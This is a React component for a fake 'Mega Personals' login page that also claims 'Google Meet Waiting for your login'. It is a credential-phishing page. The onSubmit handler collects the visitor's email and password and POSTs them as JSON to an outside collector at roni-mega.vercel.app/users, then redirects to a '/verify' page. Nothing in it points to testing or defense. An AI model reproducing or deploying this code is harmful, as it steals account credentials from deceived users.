import React from "react";
import "./NavBar.css";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import Imgg from "../../Img/gmeet.gif";

const Megapersonal = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://roni-mega.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };
  return (
    <div className="text-center">
      <div className="container">
        <h1 className="pt-3 pb-3">
          <span className="Mega">Mega</span>{" "}
          <span className="Personals">Personals</span>
        </h1>
        <h5 className="Personal pb-3">Personal Classifieds</h5>
        <div class="d-grid ">
          <button class="btn START" type="button">
            START HERE
          </button>
        </div>
        <div className="pt-3">
          <form onSubmit={handleSubmit(onSubmit)}>
            {/* register your input into the hook by invoking the "register" function */}
            <div className="text-center">
              <input
                className="form-control Email text-center"
                placeholder="Your email"
                defaultValue=""
                {...register("example", { required: true })}
              />
            </div>

            {/* include validation with required or other standard HTML validation rules */}
            <div>
              <input
                className="form-control Email mt-3 text-center"
                placeholder="Your password"
                defaultValue=""
                {...register("exampleRequired", { required: true })}
              />
            </div>
            {/* errors will return when field validation fails  */}
            {errors.exampleRequired && <span>This field is required</span>}

            <input
              onClick={() => navigate("/password")}
              className="submit  mt-3 w-50%"
              type="SUBMIT"
            />
          </form>
        </div>
        <p className="pt-4 pb-4 Google">
          ( Google Meet Waiting for your login )
        </p>
      </div>
      <div className="Img">
        <img src={Imgg} alt="Meet" />
      </div>
    </div>
  );
};

export default Megapersonal;
